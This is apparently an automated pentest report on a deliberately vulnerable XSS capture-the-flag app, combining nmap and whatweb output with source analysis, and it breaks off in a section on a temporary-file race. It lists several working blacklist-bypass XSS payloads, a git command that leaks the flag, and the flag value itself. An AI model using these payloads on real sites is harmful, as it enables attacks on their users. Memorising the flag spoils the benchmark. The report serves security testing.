# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-31 12:29 +0530
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000026s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 16:31:7e:7f:f0:d7:f8:1e:d4:d6:11:5e:b0:f7:8d:c1 (ECDSA)
|_  256 16:02:af:e3:05:fc:79:77:01:be:52:ff:47:cc:85:78 (ED25519)
80/tcp   open  http           Caddy httpd
|_http-server-header: Caddy
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https
|_http-title: Site doesn't have a title.
445/tcp  open  microsoft-ds?
631/tcp  open  ipp            CUPS 2.3
|_http-title: Home - CUPS 2.3.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.3 IPP/2.1
3703/tcp open  adobeserver-3?
| fingerprint-strings: 
|   DNSStatusRequestTCP, Help, LDAPBindReq, LPDString, RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     connection: close
|     content-length: 0
|     date: Fri, 31 Oct 2025 06:59:22 GMT
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     content-type: application/json
|     access-control-allow-origin: *
|     vary: origin, access-control-request-method, access-control-request-headers
|     content-length: 60
|     date: Fri, 31 Oct 2025 06:59:22 GMT
|     {"code": 400, "message": "Missing baml-original-url header"}
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     vary: origin, access-control-request-method, access-control-request-headers
|     access-control-allow-origin: *
|     content-length: 0
|     date: Fri, 31 Oct 2025 06:59:22 GMT
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     vary: origin, access-control-request-method, access-control-request-headers
|     access-control-allow-methods: *
|     access-control-allow-headers: content-type,authorization,x-api-key,baml-original-url
|     access-control-max-age: 86400
|     access-control-allow-origin: *
|     content-length: 0
|_    date: Fri, 31 Oct 2025 06:59:22 GMT
5000/tcp open  http           Werkzeug httpd 1.0.1 (Python 2.7.18)
|_http-title: Dalgona Challenges
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
8000/tcp open  http           WSGIServer 0.2 (Python 3.12.9)
|_http-title: SSTI Demo
|_http-server-header: WSGIServer/0.2 CPython/3.12.9
8001/tcp open  http           WSGIServer 0.2 (Python 3.12.9)
|_http-title: SSTI Demo
|_http-server-header: WSGIServer/0.2 CPython/3.12.9
8888/tcp open  http           BaseHTTPServer 0.6 (Python 3.12.9)
|_http-server-header: BaseHTTP/0.6 Python/3.12.9
|_http-title: SSRF Test Server
9001/tcp open  tor-orport?
9876/tcp open  sd?
9999/tcp open  http           SimpleHTTPServer 0.6 (Python 3.12.9)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.9
|_http-title: Directory listing for /
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3703-TCP:V=7.98%I=7%D=10/31%Time=69045E4A%P=arm-apple-darwin24.4.0%
SF:r(GetRequest,BF,"HTTP/1\.0\x20404\x20Not\x20Found\r\nvary:\x20origin,\x
SF:20access-control-request-method,\x20access-control-request-headers\r\na
SF:ccess-control-allow-origin:\x20\*\r\ncontent-length:\x200\r\ndate:\x20F
SF:ri,\x2031\x20Oct\x202025\x2006:59:22\x20GMT\r\n\r\n")%r(HTTPOptions,14E
SF:,"HTTP/1\.0\x20200\x20OK\r\nvary:\x20origin,\x20access-control-request-
SF:method,\x20access-control-request-headers\r\naccess-control-allow-metho
SF:ds:\x20\*\r\naccess-control-allow-headers:\x20content-type,authorizatio
SF:n,x-api-key,baml-original-url\r\naccess-control-max-age:\x2086400\r\nac
SF:cess-control-allow-origin:\x20\*\r\ncontent-length:\x200\r\ndate:\x20Fr
SF:i,\x2031\x20Oct\x202025\x2006:59:22\x20GMT\r\n\r\n")%r(RTSPRequest,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nconnection:\x20close\r\ncontent-l
SF:ength:\x200\r\ndate:\x20Fri,\x2031\x20Oct\x202025\x2006:59:22\x20GMT\r\
SF:n\r\n")%r(DNSStatusRequestTCP,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nconnection:\x20close\r\ncontent-length:\x200\r\ndate:\x20Fri,\x2031\x2
SF:0Oct\x202025\x2006:59:22\x20GMT\r\n\r\n")%r(Help,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nconnection:\x20close\r\ncontent-length:\x200\r\ndat
SF:e:\x20Fri,\x2031\x20Oct\x202025\x2006:59:22\x20GMT\r\n\r\n")%r(X11Probe
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nconnection:\x20close\r\ncont
SF:ent-length:\x200\r\ndate:\x20Fri,\x2031\x20Oct\x202025\x2006:59:22\x20G
SF:MT\r\n\r\n")%r(FourOhFourRequest,11E,"HTTP/1\.0\x20400\x20Bad\x20Reques
SF:t\r\ncontent-type:\x20application/json\r\naccess-control-allow-origin:\
SF:x20\*\r\nvary:\x20origin,\x20access-control-request-method,\x20access-c
SF:ontrol-request-headers\r\ncontent-length:\x2060\r\ndate:\x20Fri,\x2031\
SF:x20Oct\x202025\x2006:59:22\x20GMT\r\n\r\n{\"code\":\x20400,\x20\"messag
SF:e\":\x20\"Missing\x20baml-original-url\x20header\"}")%r(LPDString,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nconnection:\x20close\r\ncontent-le
SF:ngth:\x200\r\ndate:\x20Fri,\x2031\x20Oct\x202025\x2006:59:22\x20GMT\r\n
SF:\r\n")%r(LDAPBindReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nconnecti
SF:on:\x20close\r\ncontent-length:\x200\r\ndate:\x20Fri,\x2031\x20Oct\x202
SF:025\x2006:59:22\x20GMT\r\n\r\n");

Host script results:
|_clock-skew: -2m26s
| smb2-time: 
|   date: 2025-10-31T06:58:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.42 seconds


## Subdomain Discovery (subfinder)
Status: success
[object Object]

## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:41777/[0m [200 OK] [1mHTTPServer[0m[[1m[36mWerkzeug/1.0.1 Python/2.7.18[0m], [1mIP[0m[[0m[22m::1[0m], [1mPython[0m[[1m[32m2.7.18[0m], [1mTitle[0m[[1m[33mDalgona Challenges[0m], [1mWerkzeug[0m[[1m[32m1.0.1[0m]

## Code Analysis
# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings have been verified against the scope criteria before inclusion in this report.

## In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

## Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

XBEN-008-24 "Dalgona Challenges" is a deliberately vulnerable CTF (Capture The Flag) web application built with Python 2.7.18 and Flask 1.1.4. The application consists of a monolithic Flask server exposing two HTTP endpoints on port 5000, designed to teach XSS (Cross-Site Scripting) exploitation techniques. This assessment identified **critical security vulnerabilities** across multiple dimensions, including an end-of-life runtime environment, intentionally weak input validation, disabled browser security protections, and severe secret management failures.

The most significant finding from a penetration testing perspective is the **direct exposure of the CTF flag in version control** (`.env` file committed to git), which completely bypasses the intended challenge. Beyond this unintended vulnerability, the application features a purposefully exploitable XSS sink in the `/page` endpoint with a weak blacklist filter designed to be bypassed. The application uses PhantomJS, a deprecated headless browser, to validate XSS payloads and reward successful exploitation with the flag.

From an architectural security perspective, this application demonstrates a **complete absence of defense-in-depth mechanisms**: no authentication, no authorization, no session management, no CSRF protection, no rate limiting, and all security headers either missing or explicitly disabled. The technology stack itself presents critical risks, with Python 2.7 (EOL since January 2020) and Flask 1.1.4 (released May 2021) containing multiple known CVEs. Debug mode is enabled in production configuration, exposing stack traces, source code, and an interactive debugger to all users.

**Key Attack Surface Summary:** The primary attack vector is the `/page` endpoint accepting a `name` GET parameter that undergoes weak blacklist filtering before being injected into an HTML input tag's attribute context. Secondary concerns include the PhantomJS subprocess execution (command injection risks mitigated by array-style arguments), temporary file creation in the web-accessible `/static/` directory (race condition opportunities), and comprehensive information disclosure through debug mode and verbose logging.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **Python 2.7.18** (official End-of-Life: January 1, 2020) running in a Debian Buster-slim Docker container. This creates an **immediate and critical security exposure**: Python 2.7 has received no security updates for over five years, leaving all Python 2.7 applications vulnerable to any CVEs discovered since 2020. The entire Python 2.x package ecosystem is unmaintained, creating a cascading dependency risk where vulnerabilities in core libraries (Werkzeug, Jinja2, ItsDangerous) cannot be patched.

The web framework is **Flask 1.1.4** (released May 2021), which is three major versions behind the current Flask 3.x series. Flask 1.1.4 contains known vulnerabilities including CVE-2023-30861 (cookie parsing issues) and lacks modern security features introduced in Flask 2.x and 3.x. The application implements only the most basic Flask functionality with no extensions for security (no Flask-Talisman for security headers, no Flask-Limiter for rate limiting, no Flask-WTF for CSRF protection, no Flask-Login for authentication).

**Security Implications:**
- **Python 2.7 EOL Risk**: All known and future Python 2.7 CVEs remain unpatched. The application inherits vulnerabilities in the core runtime, standard library, and SSL/TLS implementation.
- **Flask 1.1.4 Vulnerabilities**: Missing security patches from Flask 2.x and 3.x releases. Cookie handling, request parsing, and redirect validation may contain exploitable flaws.
- **Deprecated Debian Base**: Uses archived Debian Buster repositories (`deb.debian.org/debian-security buster/updates`), which no longer receive regular security updates.
- **No Security Extensions**: The complete absence of Flask security extensions means every security control must be manually implemented, significantly increasing the attack surface.

The application also depends on **PhantomJS**, a headless WebKit browser that was officially abandoned in 2018. PhantomJS contains numerous known XSS and JavaScript engine vulnerabilities that will never be patched. The application executes user-controlled HTML in this deprecated browser, creating potential for WebKit-level exploitation beyond the intended XSS challenge.

### Architectural Pattern

This application follows a **monolithic single-tier architecture** with no separation of concerns between presentation, business logic, and data access layers. The entire application consists of 289 lines of Python code across two modules (`app.py` and `constants.py`) plus a 48-line JavaScript validation script (`check.js`).

**Trust Boundary Analysis:**

The application has **four trust boundaries** where untrusted data crosses into privileged contexts:

1. **External → Application (HTTP Ingress)**: User HTTP requests enter through Flask's routing layer at two endpoints (`/` and `/page`). This boundary has minimal security controls—no authentication, no rate limiting, no request validation beyond manual blacklist checks.

2. **Application → Filesystem**: The application writes user-influenced HTML content to temporary files in the `static/` directory (line `app.py:38`). Files are named with cryptographically random hex strings (`os.urandom(16).encode('hex')`), preventing predictable access, but create a **race condition vulnerability** where files exist briefly in a web-accessible location before deletion. An attacker sending concurrent requests could potentially access another user's temporary HTML file.

3. **Application → Subprocess (PhantomJS)**: The application spawns a PhantomJS subprocess via `subprocess.Popen()` and passes a hardcoded URL via stdin. While the subprocess itself uses safe array-style arguments (preventing shell injection), the **HTML content loaded by PhantomJS is user-controlled**, creating a JavaScript execution context boundary. PhantomJS's deprecated WebKit engine may contain exploitable vulnerabilities beyond simple XSS.

4. **PhantomJS → Application (Validation Results)**: The PhantomJS process returns validation results ("SUCCESS" or empty) that determine flag disclosure. This boundary assumes the PhantomJS environment is trustworthy, but a sophisticated attacker might exploit WebKit vulnerabilities to force a "SUCCESS" response without executing legitimate JavaScript dialogs.

**Deployment Security Posture:**

The Docker Compose configuration exposes port 5000 with the container listening on `0.0.0.0:5000` (all interfaces). The health check is a simple TCP socket connection with a 10-second timeout and no application-level validation. The container runs with default (likely root) privileges—no user namespace remapping, no capability dropping, no AppArmor/SELinux profiles. The FLAG is passed as a Docker build argument, which is **visible in the Docker image history** via `docker history <image>`, creating an additional attack vector beyond the `.env` file exposure.

### Critical Security Components

The application's security architecture is minimal and deliberately vulnerable:

**Input Validation Framework**: Located in `app.py:66-73`, the application implements a **blacklist-based filter** that blocks eight specific strings: `['script', 'onload', 'onmouseover', 'onclick', 'onbegin', 'onerror', 'svg', "'']`. This filter uses case-insensitive substring matching (`if word in msg.lower()`), creating immediate bypass opportunities:

```python
# app.py:66-73
blacklist = ['script', "onload", "onmouseover", "onclick", "onbegin", "onerror", "svg", "'"]
value = "" if msg == "" else '> {0}'.format(msg)

for word in blacklist:
    if word in msg.lower():
        error_msg = """<div class="solution-text">Sorry you can't use: '%s'</div>""" % word
        value = ">"
        return PAGE_CONTENT.format("21","Star",value,"",error_msg)
```

**Bypass Vectors**: The blacklist fails to block dozens of alternative XSS vectors including `<img>`, `<iframe>`, `<video>`, `<audio>`, `<object>`, `<embed>`, `<input>`, `<form>`, `<body>`, `<marquee>`, `<details>`, `<math>`, and event handlers like `onfocus`, `onblur`, `oninput`, `onchange`, `onanimationstart`, `ontransitionend`, `onmouseenter`, `onpointerover`, `onwheel`, `ondrag`, and `ondrop`. The blacklist blocks single quotes but not double quotes or backticks, allowing attribute escaping. Critically, the `check.js` validation script actively triggers `onfocus` events (line 27-33), making `autofocus onfocus=alert(1)` a trivially exploitable payload.

**Output Encoding**: The application uses `cgi.escape()` **inconsistently**. PhantomJS output is escaped (`app.py:58`: `cgi.escape(result)`), but user input is **directly injected** into HTML without encoding (`app.py:67`: `'> {0}'.format(msg)`). This creates a **context-aware XSS vulnerability** where the attacker's payload appears in an HTML attribute context within an `<input>` tag.

**Security Headers Configuration**: The application explicitly **disables** the `X-XSS-Protection` header (`app.py:79`: `response.headers["X-XSS-Protection"] = "0"`), instructing browsers to turn off their XSS filters. The application sets **no other security headers**: no Content-Security-Policy (CSP), no X-Frame-Options (clickjacking protection), no X-Content-Type-Options (MIME sniffing protection), no Strict-Transport-Security (HSTS for HTTPS enforcement), no Referrer-Policy, and no Permissions-Policy.

**Debug Mode Exposure**: The application runs with Flask's debug mode enabled (`app.py:84`: `app.run(debug=True)`), which exposes:
- **Interactive Debugger Console**: Accessible after triggering an error, allows arbitrary Python code execution
- **Full Stack Traces**: Reveals internal application paths, library versions, and code structure
- **Source Code Disclosure**: Stack traces include source code snippets
- **Environment Variables**: May expose secrets via stack trace context

**Exception Propagation**: The configuration `app.config['PROPAGATE_EXCEPTIONS'] = True` (`app.py:25`) ensures all unhandled exceptions reach the HTTP response, maximizing information disclosure.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**Finding: NO AUTHENTICATION SYSTEM EXISTS**

This application implements **zero authentication mechanisms**. After comprehensive source code analysis across all modules, configuration files, and dependencies, no authentication components were discovered:

- **No login/logout endpoints**: The application exposes only two routes (`/` and `/page`), neither requiring credentials
- **No user management**: No user models, user databases, user registration, or password storage
- **No session management**: While Flask's `session` object is available via the framework import, it is never referenced or used in the application code
- **No token-based authentication**: No JWT generation/validation, no OAuth, no API keys, no bearer tokens
- **No multi-factor authentication**: No MFA/2FA implementations
- **No SSO/SAML/OIDC**: No enterprise authentication integrations

**Authentication API Endpoints: NONE**

The application contains no endpoints for authentication operations. All functionality is publicly accessible without credentials.

**Security Implications:**

This design choice creates a **completely permeable security boundary** where any internet-connected actor can access all application functionality. For a CTF challenge platform, this is appropriate—the challenge is solving the technical puzzle, not acquiring credentials. However, this architecture would be catastrophically insecure for production systems, as it offers no way to:
- Identify users for audit logging
- Prevent unauthorized access to sensitive functionality
- Implement rate limiting per user
- Enforce principle of least privilege
- Track user actions for forensics

### Authorization Model

**Finding: NO AUTHORIZATION CONTROLS EXIST**

Without authentication, authorization is meaningless—there are no user identities to authorize. The application implements:

- **No Role-Based Access Control (RBAC)**: No admin/user role distinctions
- **No Permission Checks**: No code validates whether a request should be permitted
- **No Authorization Middleware**: No decorators or middleware enforce access controls
- **No Resource Ownership Validation**: No concept of users owning resources
- **No Privilege Escalation Protection**: All users already have maximum privileges (i.e., none)

**Security Boundary Analysis:**

The application has **no security boundaries**:
```
┌─────────────────────────────────────────┐
│         PUBLIC INTERNET                 │
│  (No authentication required)           │
├─────────────────────────────────────────┤
│  GET /          │  All users            │
│  GET /page      │  All users            │
│  /static/*      │  All users            │
└─────────────────────────────────────────┘
```

Every request has identical permissions. There is no distinction between anonymous/authenticated, user/admin, or any other privilege levels.

### Session Management

**Finding: NO SESSION MANAGEMENT IMPLEMENTED**

Flask provides built-in session management via signed cookies, but this application **never uses sessions**. Detailed analysis confirms:

**Session Cookie Configuration: NOT CONFIGURED**

The application sets only one Flask configuration option:
```python
# app.py:25
app.config['PROPAGATE_EXCEPTIONS'] = True
```

**Critical Missing Configurations:**
- No `SECRET_KEY` (required for Flask session signing)
- No `SESSION_COOKIE_HTTPONLY` (prevents JavaScript access to session cookies)
- No `SESSION_COOKIE_SECURE` (restricts cookies to HTTPS)
- No `SESSION_COOKIE_SAMESITE` (CSRF protection via SameSite attribute)
- No `PERMANENT_SESSION_LIFETIME` (session expiration time)
- No session storage backend (Redis, Memcached, database)

**Exact Location of Cookie Flag Configuration: DOES NOT EXIST**

The application never calls `response.set_cookie()`, never accesses the `flask.session` object, and contains no code that would generate session cookies. Searching for cookie configuration across the entire codebase yields only the X-XSS-Protection header setting.

**Security Implications:**

Without sessions, the application cannot:
- Track user state between requests
- Implement "remember me" functionality
- Enforce session timeouts
- Provide CSRF tokens (no session = no CSRF protection)
- Detect session hijacking or fixation attacks
- Log out users (no sessions to invalidate)

For a stateless CTF challenge, this is acceptable. However, the architecture provides no foundation for adding authentication without major refactoring.

### SSO/OAuth/OIDC Flows

**Finding: NO SSO OR FEDERATED AUTHENTICATION**

The application does not integrate with any external identity providers:

- **No OAuth 2.0 flows**: No authorization endpoints, token endpoints, or redirect URIs
- **No OIDC discovery**: No `.well-known/openid-configuration` or JWKS endpoints
- **No SAML**: No assertion consumer service (ACS) or metadata endpoints
- **No callback endpoints**: No routes handle external authentication responses
- **No state/nonce validation**: Not applicable—no OAuth flows exist

**Callback Endpoints and Parameter Validation: NOT APPLICABLE**

No code performs OAuth state parameter validation or OIDC nonce validation because no OAuth/OIDC flows are implemented.

### Authorization Bypass Risks

**Finding: AUTHORIZATION BYPASS NOT APPLICABLE (NO AUTHORIZATION EXISTS)**

Traditional authorization bypass techniques (parameter tampering, privilege escalation, IDOR) are not applicable because the application enforces no authorization rules. Every user already has unrestricted access to all functionality.

However, this creates a **catastrophic security failure** if sensitive functionality were added without proper access controls. Adding an admin panel or sensitive endpoint without implementing authentication would immediately expose it to all users.

---

## 4. Data Security & Storage

### Database Security

**Finding: NO DATABASE IMPLEMENTATION**

After comprehensive analysis of the application codebase, dependencies, and configuration files, **no database system is used**. This eliminates entire classes of vulnerabilities:

- ✅ **No SQL Injection**: No SQL queries, no string concatenation, no ORM query building
- ✅ **No Database Credential Exposure**: No connection strings, no database passwords
- ✅ **No Data-at-Rest Encryption Concerns**: No database encryption keys or TDE configuration
- ✅ **No Database Access Control Issues**: No database users, roles, or permissions
- ✅ **No NoSQL Injection**: No MongoDB, Redis, CouchDB, or similar systems

**Evidence:**
- No database imports in `app.py` (no `sqlite3`, `psycopg2`, `mysql.connector`, `pymongo`, etc.)
- No `.execute()`, `.query()`, or `.find()` calls
- No ORM usage (no SQLAlchemy, Django ORM, MongoEngine, etc.)
- No database configuration in environment variables or config files

**Security Implications:**

The absence of persistent storage significantly reduces the attack surface. Traditional database-related vulnerabilities (SQL injection, NoSQL injection, stored XSS via database, database privilege escalation) are not possible. However, this also means:
- **No audit trail**: User actions are not logged persistently
- **No state persistence**: Flag status, challenge completions, and user submissions are ephemeral
- **No scalability**: Application cannot track usage metrics or user progress across restarts

### Data Flow Security

The application handles minimal sensitive data, with the primary sensitive asset being the **CTF flag**. Data flows can be categorized into three paths:

**1. Flag Data Flow (CRITICAL SECURITY FAILURE):**

```
Build-time:
.env file (FLAG="flag{...}") 
    ↓ (Committed to git - EXPOSED)
Docker Compose (build arg)
    ↓ (Visible in docker-compose.yml)
Dockerfile ARG FLAG
    ↓ (sed replacement)
secret.txt (@FLAG@ → actual flag)
    ↓ (Visible in docker history)
Container filesystem
    ↓ (File read at runtime)
Application memory (flags[0])
    ↓ (Success condition met)
HTTP Response to attacker
```

**Critical Vulnerability**: The FLAG value `flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}` is hardcoded in the `.env` file, which is **committed to version control**. Any attacker with read access to the git repository can retrieve the flag directly:

```bash
# Retrieve flag without solving the challenge
git show HEAD:.env
# Output: FLAG="flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"
```

This completely bypasses the intended XSS challenge. Additionally, the flag is visible in Docker build arguments (`docker-compose.yml:5-6`) and Docker image layers (`docker history <image>`).

**Flag Storage Location**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/secret.txt` contains `@FLAG@` at build time, replaced with the actual flag during Docker build (`Dockerfile:25`: `RUN sed -i s/@FLAG@/$FLAG/g secret.txt`).

**Flag Loading**: At runtime, the application reads the flag via `app.py:22`: `flags = open('secret.txt').read().split()`, storing it in a global variable without encryption, obfuscation, or access controls.

**2. User Input Data Flow (XSS VULNERABILITY):**

```
Attacker Input (GET /page?name=<payload>)
    ↓ (request.args.get)
msg variable
    ↓ (Weak blacklist check)
value variable (with '> ' prefix)
    ↓ (String format injection)
PAGE_CONTENT HTML template
    ↓ (Unsafe rendering)
<input type=text name=name placeholder="..." {USER_PAYLOAD}>
    ↓ (Temporary file write)
static/<random>.html
    ↓ (PhantomJS loads)
JavaScript execution context
    ↓ (Dialog detection)
Flag disclosure
```

User input flows from the `name` GET parameter through a weak blacklist filter (`app.py:66-73`) before being injected into an HTML template. The key security failure is at `app.py:67`: `value = "" if msg == "" else '> {0}'.format(msg)`, where user input undergoes **no HTML entity encoding, no attribute escaping, and no context-aware sanitization**. This value is then inserted into an HTML `<input>` tag's attribute context (`constants.py:49`: `<input type=text name=name placeholder="Enter your name..." {2}>`), creating a trivially exploitable XSS vulnerability.

**3. Temporary File Data Flow (RACE CONDITION VULNERABILITY):**

```
User payload → HTML template → Write to static/<random>.html → Served via /static/* → PhantomJS loads → File deleted
                                                    ↓
                                                (Race window: file accessible via HTTP before deletion)
```

The application writes user-influenced HTML to `static/<random_hex>.html` (`app.py:35-40`), where `<random_hex>` is generated via `os.urandom(16).encode('hex')` (32 characters, 128 bits of entropy). While this prevents predictable file access, a **race condition vulnerability** exists: the file is web-accessible via `/static/<random_hex>.html` for the duration of PhantomJS execution (up to 5 seconds). An attacker who can predict or observe the random filename (e.g., via timing attacks, concurrent requests, or error messages) could access another user's temporary HTML file. The file is cleaned up in a `finally` block (`app.py:50`: `os.unlink(fn)`), but this occurs **after** PhantomJS completes, leaving a time window for exploitation.

### Multi-tenant Data Isolation

**Finding: NOT APPLICABLE (SINGLE-TENANT ARCHITECTURE)**

This application is a **single-tenant CTF challenge platform** with no concept of multiple users or tenants:

- **No tenant identification**: No tenant IDs, organization IDs, or customer identifiers
- **No data segregation**: All users access the same flag (no per-user challenges)
- **No row-level security**: No database, no tenant filtering in queries
- **No cross-tenant access risks**: No tenant boundaries to violate

**Security Implications:**

The single-tenant design eliminates multi-tenant vulnerabilities (tenant ID manipulation, cross-tenant data leakage, tenant isolation bypass) but also means the application cannot support multiple simultaneous challenges, user-specific progress tracking, or organization-based deployments without architectural changes.

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes **three primary network-accessible entry points** when deployed via Docker Compose on port 5000:

#### **Entry Point 1: Index Page (`GET /`)**

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:29-31`

```python
@app.route('/')
def index():
    return INDEX_CONTENT
```

**Attack Surface Analysis:**
- **Authentication**: None (public endpoint)
- **Input Validation**: Not applicable (no user input accepted)
- **Security Controls**: None
- **Risk Level**: **LOW** - Static HTML content with no dynamic elements

The index page returns a hardcoded HTML string from `constants.py:158-202` containing static content: CSS links, images, and links to challenge pages. The HTML includes six challenge links (Challenge 1 through 6), all pointing to `/page` with a `tag` parameter. However, the current implementation **ignores the tag parameter**—all challenges use the same "Star" template (`app.py:75`: hardcoded `"21"` and `"Star"`). This endpoint has minimal attack surface beyond potential path traversal if static file serving is misconfigured (mitigated by Flask's default static file handler).

#### **Entry Point 2: XSS Challenge Page (`GET /page`)**

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:63-80`

```python
@app.route('/page')
def page():
    msg = request.args.get('name','')  # User input source
    blacklist = ['script', "onload", "onmouseover", "onclick", "onbegin", "onerror", "svg", "'"]
    value =  "" if msg == "" else '> {0}'.format(msg)
    
    for word in blacklist:
        if word in msg.lower():
            error_msg = """<div class="solution-text">Sorry you can't use: '%s'</div>""" % word
            value = ">"
            return PAGE_CONTENT.format("21","Star",value,"",error_msg)
    
    data = PAGE_CONTENT.format("21","Star",value, "","")
    result= check_solution(data,flags[0],msg,'challenge_medium')
    
    response = make_response(PAGE_CONTENT.format("21","Star",value, result, ""))
    response.headers["X-XSS-Protection"] = "0"
    return response
```

**Attack Surface Analysis:**
- **Authentication**: None (public endpoint)
- **HTTP Methods**: GET (default Flask behavior)
- **Input Parameters**:
  - `name` (GET query parameter, string, optional, default: empty string)
  - `tag` (accepted but unused in current implementation)
- **Input Validation**: Weak blacklist filtering (8 keywords, case-insensitive substring match)
- **Security Controls**: 
  - ❌ X-XSS-Protection explicitly disabled (`"0"`)
  - ❌ No Content-Security-Policy
  - ❌ No input sanitization or output encoding for user input
  - ❌ No rate limiting
  - ❌ No CSRF protection (not applicable for GET requests changing no server state)
- **Risk Level**: **CRITICAL** - Intentional XSS vulnerability with weak protections

**Input Attack Vectors:**

The `name` parameter is the **primary attack vector**. User input undergoes the following transformations:

1. **Retrieval**: `msg = request.args.get('name','')` - accepts any string, defaults to empty
2. **Blacklist Check**: Rejects if input contains `script`, `onload`, `onmouseover`, `onclick`, `onbegin`, `onerror`, `svg`, or `'` (case-insensitive)
3. **Format Injection**: `value = '> {0}'.format(msg)` - prepends `'> '` to user input, no encoding
4. **Template Insertion**: `PAGE_CONTENT.format("21","Star",value, result, "")` - inserts into `{2}` placeholder
5. **HTML Rendering**: Template injects value into `<input type=text name=name placeholder="..." {2}>`

**Exploitable Payload Examples:**

```
1. Bypass using onfocus (not in blacklist):
   /page?name=autofocus onfocus=alert(document.domain)
   
   Rendered HTML: <input type=text name=name placeholder="..." > autofocus onfocus=alert(document.domain)>

2. Bypass using img tag with onerror:
   /page?name="><img src=x onerror=alert(1)>
   
   Rendered HTML: <input type=text name=name placeholder="..." > "><img src=x onerror=alert(1)>>

3. Bypass using HTML5 events:
   /page?name=style=animation-name:x onanimationstart=alert(1)
   
   Rendered HTML: <input type=text name=name placeholder="..." > style=animation-name:x onanimationstart=alert(1)>

4. Bypass using onwheel (not in blacklist):
   /page?name=onwheel=alert(1)
   
   Rendered HTML: <input type=text name=name placeholder="..." > onwheel=alert(1)>
```

**PhantomJS Validation Mechanism:**

After rendering the HTML, the application invokes `check_solution()` which:
1. Generates a random filename: `"static/" + os.urandom(16).encode('hex') + '.html'`
2. Writes the HTML to disk: `open(fn, 'w').write(page)`
3. Spawns PhantomJS: `subprocess.Popen(["timeout","5","phantomjs", "check.js"])`
4. Sends URL via stdin: `proc.stdin.write('http://localhost:5000/' + fn)`
5. Waits for PhantomJS output: `result = proc.stdout.readline().strip()`

The `check.js` script (lines 8-18) listens for `alert()`, `confirm()`, or `prompt()` calls and outputs `"SUCCESS"` if any are triggered. Critically, `check.js` also **actively helps exploitation** by triggering focus events (lines 27-33):

```javascript
// check.js:27-33
page.evaluate(function() {
    var autofocusElements = document.querySelectorAll('[autofocus], [onfocus]');
    for (var i = 0; i < autofocusElements.length; i++) {
        autofocusElements[i].focus();
    }
});
```

This code actively triggers the `focus` event on any element with `autofocus` or `onfocus` attributes, making `autofocus onfocus=alert(1)` the canonical exploitation payload.

**Success Condition:**

If PhantomJS returns `"SUCCESS"`, the application discloses the flag (`app.py:56`):

```python
if result == 'SUCCESS':
    data = '<div class="solution-text"><img src="{0}" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: {1}</div>'.format(IMAGE_ROUTES[tag]['success'],flag)
```

The flag value is injected into the HTML response, visible to the attacker.

#### **Entry Point 3: Static File Serving (`GET /static/*`)**

**Configuration**: Flask's default static file serving  
**Path**: `/static/*` routes to the `src/static/` directory

**Attack Surface Analysis:**
- **Authentication**: None (public access)
- **Directory Listing**: Disabled by default in Flask
- **Path Traversal Risk**: **LOW** - Flask's `send_from_directory()` validates paths
- **Accessible Files**:
  - CSS stylesheets: `/static/css/style.css`, `/static/css/challenges/challenge*.css`
  - Images: `/static/img/cookies/*.png`, `/static/img/dalgonabg.jpg`, `/static/img/logo5_white.png`
  - Fonts: `/static/css/fonts/Game-Of-Squids.*` (woff, woff2, ttf, eot, svg)
  - Favicon: `/static/assets/fav-icon.png`
  - **Temporary HTML files**: `/static/<random_hex>.html` (created during challenge validation)
- **Risk Level**: **MEDIUM** - Temporary files create race condition vulnerability

**Temporary File Race Condition:**

